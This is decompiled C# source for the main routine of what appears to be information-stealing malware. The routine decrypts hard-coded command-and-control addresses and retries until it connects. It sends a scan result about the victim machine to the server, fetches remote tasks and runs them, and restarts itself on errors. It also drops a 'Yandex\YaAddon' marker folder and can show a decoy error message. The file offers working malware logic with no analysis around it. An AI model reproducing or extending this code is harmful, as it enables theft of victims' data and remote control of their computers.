using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;

// Token: 0x0200000D RID: 13
public static class Program
{
	// Token: 0x06000056 RID: 86 RVA: 0x00003369 File Offset: 0x00001569
	private static void Main(string[] args)
	{
		new EntryPoint().Execute();
	}

	// Token: 0x06000057 RID: 87 RVA: 0x00006440 File Offset: 0x00004640
	public static void Execute(this EntryPoint entry)
	{
		try
		{
			if (!string.IsNullOrWhiteSpace(entry.Message))
			{
				new Thread(delegate()
				{
					MessageBox.Show(StringDecrypt.Decrypt(entry.Message, entry.Key), "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				})
				{
					IsBackground = true
				}.Start();
			}
			using (EndpointConnection endpointConnection = new EndpointConnection())
			{
				bool flag = false;
				while (!flag)
				{
					foreach (string address in StringDecrypt.Decrypt(entry.IP, entry.Key).Split(new string[]
					{
						"|"
					}, StringSplitOptions.RemoveEmptyEntries))
					{
						if (endpointConnection.RequestConnection(address) && endpointConnection.TryGetConnection())
						{
							flag = true;
							break;
						}
					}
					Thread.Sleep(5000);
				}
				ScanningArgs settings = new ScanningArgs();
				while (!endpointConnection.TryGetArgs(out settings))
				{
					if (!endpointConnection.TryGetConnection())
					{
						throw new Exception();
					}
					Thread.Sleep(1000);
				}
				ScanResult scanResult = new ScanResult
				{
					ReleaseID = StringDecrypt.Decrypt(entry.ID, entry.Key)
				};
				IdentitySenderBase identitySenderBase = SenderFactory.Create(entry.Version);
				while (!identitySenderBase.Send(endpointConnection, settings, ref scanResult))
				{
					Thread.Sleep(5000);
				}
				ScanResult user = scanResult;
				user.ScanDetails = new ScanDetails();
				user.Monitor = null;
				IList<UpdateTask> tasks = new List<UpdateTask>();
				while (!endpointConnection.TryGetTasks(user, out tasks))
				{
					if (!endpointConnection.TryGetConnection())
					{
						throw new Exception();
					}
					Thread.Sleep(1000);
				}
				foreach (int taskId in new TaskResolver(scanResult).ReleaseUpdates(tasks))
				{
					while (!endpointConnection.TryCompleteTask(user, taskId))
					{
						if (!endpointConnection.TryGetConnection())
						{
							throw new Exception();
						}
						Thread.Sleep(1000);
					}
				}
			}
		}
		catch (Exception)
		{
			entry.Execute();
		}
	}

	// Token: 0x06000058 RID: 88 RVA: 0x00006690 File Offset: 0x00004890
	public static bool SeenBefore()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Yandex\\YaAddon");
			if (Directory.Exists(path))
			{
				return true;
			}
			Directory.CreateDirectory(path);
			return false;
		}
		catch
		{
		}
		return false;
	}
}
